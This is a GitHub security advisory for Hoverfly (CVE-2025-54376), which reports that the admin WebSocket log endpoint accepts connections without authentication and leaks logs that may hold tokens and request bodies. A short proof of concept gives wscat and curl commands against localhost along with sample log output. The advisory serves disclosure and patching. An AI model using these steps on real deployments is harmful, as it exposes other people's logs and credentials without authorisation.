# [H] WebSocket endpoint `/api/v2/ws/logs` reachable without authentication even when --auth is enabled

## Summary
Severity: High
Advisory: GHSA-jxmr-2h4q-rhxp
CVE: CVE-2025-54376
CWE: CWE-200, CWE-287
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-09-10
Source: https://github.com/advisories/GHSA-jxmr-2h4q-rhxp
Type: github-advisory

## Affected
- Go: `github.com/SpectoLabs/hoverfly` — affected >=0 <1.12.0

## Details
### Summary
Hoverfly’s admin WebSocket endpoint /api/v2/ws/logs is not protected by the same authentication middleware that guards the REST admin API.
Consequently, an unauthenticated remote attacker can:

- Stream real-time application logs (information disclosure).
- Gain insight into internal file paths, request/response bodies, and other potentially sensitive data emitted in logs.

### PoC
1. Start Hoverfly with authentication enabled:

```
./hoverfly -auth
```

2. Confirm REST API requires credentials:

```
curl -i http://localhost:8888/api/v2/hoverfly/version
```

3. Connect to the WebSocket endpoint without credentials:


```
wscat -c ws://localhost:8888/api/v2/ws/logs
# Connected (press CTRL+C to quit)
# … logs stream immediately … (You would need to send a message to start receiving stream)
```

```
wscat -c ws://localhost:8888/api/v2/ws/logs
Connected (press CTRL+C to quit)
> hi!
< {"logs":[{"level":"info","msg":"Log level set to verbose","time":"2025-07-20T17:07:00+05:30"},{"level":"info","msg":"Using memory backend","time":"2025-07-20T17:07:00+05:30"},{"level":"info","msg":"User added successfully","time":"2025-07-20T17:07:00+05:30","username":""},{"level":"info","msg":"Enabling proxy authentication","time":"2025-07-20T17:07:00+05:30"},{"Destination":".","Mode":"simulate","ProxyPort":"8500","level":"info","msg":"Proxy prepared...","time":"2025-07-20T17:07:00+05:30"},{"destination":".","level":"info","mode":"simulate","msg":"current proxy configuration","port":"8500","time":"2025-07-20T17:07:00+05:30"},{"level":"info","msg":"serving proxy","time":"2025-07-20T17:07:00+05:30"},{"AdminPort":"8888","level":"info","msg":"Admin interface is starting...","time":"2025-07-20T17:07:00+05:30"},{"level":"debug","message":"hi!","msg":"Got message...","time":"2025-07-20T17:09:04+05:30"}]}
< ...
< ...
```

### Impact
Authentication bypass; an attacker receives full application logs, including proxied request/response bodies, tokens, file paths, etc.

## References
- https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-jxmr-2h4q-rhxp
- https://nvd.nist.gov/vuln/detail/CVE-2025-54376
- https://github.com/SpectoLabs/hoverfly/commit/ffc2cc34563de67fe1a04f7ba5d78fa2d4564424
- https://github.com/SpectoLabs/hoverfly
- https://pkg.go.dev/vuln/GO-2025-3945
